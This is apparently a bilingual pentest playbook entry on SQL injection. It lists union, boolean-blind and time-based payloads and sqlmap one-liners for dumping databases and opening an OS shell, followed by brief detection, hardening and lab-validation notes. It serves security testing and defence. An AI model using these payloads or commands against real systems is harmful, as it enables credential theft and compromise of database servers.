---
title: SQL Injection
phase: explotacion
platform: web
tags: [sqli, injection, database, web]
risk: critical
attack_tactic: TA0002
attack_technique: T1059
data_sources: [database-logs, web-server-logs, ids-ips, waf-logs]
last_review: 2026-05-25
---

# SQL Injection

### Objetivo

Explotar inyecciones SQL para extraer datos, evadir autenticación, o ejecutar comandos en el servidor de base de datos.

### Detection

```bash
# Classic detection
' OR '1'='1
' OR '1'='1' --
" OR "1"="1
' OR 1=1 --
```

### Union-Based Injection

```sql
' UNION SELECT null,version(),user()--
' UNION SELECT null,table_name FROM information_schema.tables--
' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT null,username,password FROM users--
```

### Boolean-Based Blind

```sql
' AND 1=1 --
' AND 1=2 --
' AND (SELECT 1 FROM users LIMIT 1)='1
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=64--
```

### Time-Based Blind

```sql
'; IF(1=1) WAITFOR DELAY '00:00:05'--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; BENCHMARK(5000000,MD5('test'))--
```

### One-liners con sqlmap

```bash
# Basic scan
sqlmap -u "http://target.com/?id=1" --batch

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Dump database
sqlmap -u "http://target.com/?id=1" --dump --batch --level=2

# OS shell
sqlmap -u "http://target.com/?id=1" --os-shell

# Use existing session
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=..."
```

### Detección y Mitigación

- **Visibilidad:** WAF blocks or alerts, SQL errors in logs, anomalous database query patterns.
- **Hardening:** Parameterized queries (prepared statements), input validation, least privilege DB user, WAF, database query logging.

### Validación de Cobertura

- **Prueba técnica:** sqlmap scan in lab.
- **Criterio de éxito:** WAF blocks, SQL errors logged and alerted, no extraction of data via SQLi.
